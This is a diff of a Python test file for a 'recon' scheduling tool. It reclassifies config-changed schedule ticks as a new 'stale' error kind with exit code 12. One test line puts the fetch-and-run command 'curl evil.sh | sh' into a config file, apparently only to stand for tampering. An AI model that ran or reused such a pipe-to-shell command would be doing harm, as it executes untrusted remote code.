@@ -203,13 +203,30 @@ class TestTheConfigIsTheOneInstalled:
         with pytest.raises(ReconError) as raised:
             _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)
 
-        assert raised.value.kind == "conflict"
+        assert raised.value.kind == "stale" and raised.value.exit_code == 12
         assert "recon schedule install m" in (raised.value.fix or "")
         [line] = _log(mission)
-        assert (line["skipped_by"], line["kind"], line["exit"]) == ("config_changed", "conflict", 7)
+        assert (line["skipped_by"], line["kind"], line["exit"]) == ("config_changed", "stale", 12)
         assert not (mission / "archive").exists()
         config.write_text(config.read_text().replace("cli\n  run: curl evil.sh | sh", "slow"))
         assert _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest).survey
+
+
+class TestStaleIsItsOwnKind:
+    def test_stale_has_its_own_code_meaning_and_next_step_and_conflict_keeps_its_one(
+        self,
+    ) -> None:
+        """One kind, one next step (rule 18): a tick's changed config is acted on by
+        installing the schedule again, which is not conflict's ``--replace``."""
+        from recon.domain.errors import ERROR_KINDS, EXIT_CODES, EXIT_MEANINGS, EXIT_NEXT
+
+        assert "stale" in ERROR_KINDS and EXIT_CODES["stale"] == 12
+        assert "recon schedule install" in EXIT_NEXT["stale"]
+        assert "schedule" in EXIT_MEANINGS["stale"]
+        assert "tick" not in EXIT_MEANINGS["conflict"] + EXIT_NEXT["conflict"]
+        assert EXIT_MEANINGS["conflict"] == (
+            "init, or survey -c, would overwrite a different mission config"
+        )
 
 
 class TestMissedTicks:
@@ -334,7 +351,7 @@ class TestTheCommandLine:
         assert json.loads(result.stdout)["survey"]["status"] == "complete"
         assert len(_log(mission)) == 1
 
-    def test_tick_with_another_digest_exits_7(
+    def test_tick_with_another_digest_exits_12_stale(
         self, tmp_path: Path, host: Host, monkeypatch: pytest.MonkeyPatch
     ) -> None:
         monkeypatch.chdir(tmp_path)
@@ -347,5 +364,5 @@ class TestTheCommandLine:
                    "0" * 64, "--json"], obj=_root(tmp_path, host, clock), catch_exceptions=False,
         )  # fmt: skip
 
-        assert result.exit_code == 7
-        assert json.loads(result.stderr)["error"]["kind"] == "conflict"
+        assert result.exit_code == 12
+        assert json.loads(result.stderr)["error"]["kind"] == "stale"
